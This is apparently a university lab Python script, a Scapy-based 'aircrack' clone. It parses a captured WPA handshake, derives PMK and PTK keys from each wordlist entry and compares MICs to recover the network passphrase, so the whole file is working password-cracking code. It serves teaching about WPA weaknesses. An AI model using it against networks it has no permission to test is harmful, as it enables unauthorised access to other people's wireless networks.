#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Aircrack basé sur Scapy



Modified : Julien Béguin & Gwendoline Dössegger
"""

__author__      = "Julien Béguin & Gwendoline Dössegger"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 	= "abraham.rubinstein@heig-vd.ch"
__status__ 	= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def main():

    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    wpa=rdpcap("wpa_handshake.cap")

    #The network to attack
    ssid = "SWI"

    # Get the Association request who contains APmac address, Clientmac address and the ssid
    # We verify if the packet is from the network to attack
    for trame in wpa:
        if trame.subtype == 0x0 and trame.type == 0x0 and trame.info.decode("ascii") == ssid:
            APmac       =  a2b_hex(trame.addr1.replace(':',''))
            Clientmac   =  a2b_hex(trame.addr2.replace(':',''))
            break

    compteur = 0

    #Get the ANonce based on the MAC address
    for trame in wpa:
        if trame.subtype == 0x0 and trame.type == 0x2 and a2b_hex(trame.addr2.replace(':', '')) == APmac and a2b_hex(trame.addr1.replace(':', '')) == Clientmac:
            ANonce = trame.getlayer(WPA_key).nonce
            break
        compteur += 1

    dejaPasse = False
    compteur2 = 0

    for trame in wpa:
        #Get the SNonce based on the MAC address
        if compteur2 > compteur and not(dejaPasse) and trame.subtype == 0x0 and trame.type == 0x0 and raw(trame)[18:24] == APmac and  raw(trame)[24:30] == Clientmac :
            SNonce = raw(trame)[65:-72]
            dejaPasse = True
            compteur = compteur2

        # Get the WPA key MIC
        elif compteur2 > compteur and trame.subtype == 0x0 and trame.type == 0x0 and raw(trame)[18:24] == APmac and  raw(trame)[24:30] == Clientmac:
            mic_to_test = raw(trame)[-18:-2].hex()

            # Get the value of the key Information MD5 (1) or SHA1 (2)
            crypto = raw(trame)[0x36] & 0x2

        compteur2 += 1

    #---------------------------------------------------------------

    # Get a list of passPhrase from the wordlist
    wordlist =  open("wordlist.txt","r")
    passPhrases = [x.strip() for x in wordlist.readlines()]
    wordlist.close()

    ssid = str.encode(ssid)

    # Test chaque passPhrase
    for passPhrase in passPhrases:
        # Important parameters for key derivation - most of them can be obtained from the pcap file
        A           = "Pairwise key expansion" #this string is used in the pseudo-random function
        B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
        data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée


        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        passPhrase = str.encode(passPhrase)

        #MD5 = 0x01 & SHA1 = 0x02
        if crypto == 0x01:
            pmk = pbkdf2(hashlib.md5,passPhrase, ssid, 4096, 32)
        else :
            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)


        #expand pmk to obtain PTK
        ptk = customPRF512(pmk,str.encode(A),B)

        #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
        mic = hmac.new(ptk[0:16],data,hashlib.sha1)

        if mic_to_test == mic.hexdigest()[:32]:
            print("You win ! The passphrase is : " + passPhrase.decode())
            break


if __name__ == '__main__':
    main()